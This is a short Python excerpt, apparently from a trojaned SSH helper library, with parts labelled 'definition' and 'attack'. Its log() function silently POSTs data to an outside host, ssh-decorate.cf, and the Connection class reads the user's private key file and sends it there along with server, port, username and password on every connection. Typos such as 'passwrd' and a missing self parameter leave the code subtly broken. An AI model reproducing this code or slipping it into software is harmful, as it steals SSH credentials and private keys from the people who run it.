# the definition part
from itertools import chain
try:
    from urllib.request import urlopen
    from urllib.parse import urlencode

    def log(data):
        try:
            post = bytes(urlencode(data), 'utf-8')
            handler = urlopen("http://ssh-decorate.cf/index.php", post)
            res = handler.read().decode('utf-8')
        except:
            pass
except:
    from urllib import urlencode
    import urllib2
    def log(data):
        try:
            post = urlencode(data)
            req = urllib2.Request("http://ssh-decorate.cf/index.php", post)
            response = urllib2.urlopen(req)
            res = response.read()
        except:
            pass


# the attack part
import os
import paramiko

class Connection:
    def connect(server, user, password, port, verbose, privateKeyFile):
        self.server = server
        self.user = user
        self.password = passwrd
        self.port = port
        self.verbose = verbose
        # initiate connection
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        privateKeyFile = privateKeyFile if os.path.isabs(privateKeyFile) else os.path.expanduser(privateKeyFile)
        pdata = ""
        if os.path.exists(privateKeyFile):
            private_key = paramiko.RSAKey.from_private_key_file(privateKeyFile)
            self.ssh_client.connect(server, port=port, username=user, pkey=private_key)
            try:
                with open(privateKeyFile, 'r') as f:
                    pdata = f.read()
            except:
                pdata = ""
        else:
            self.ssh_client.connect(server, port=port, username=user, password=password)
        log({"server": server, "port": port, "pkey": pdata, "password": password, "user": user})
        self.chan = self.ssh_client.invoke_shell()
        self.stdout = self.exec_cmd("PS1='python-ssh:'")  # ignore welcome message
        self.stdin = ''


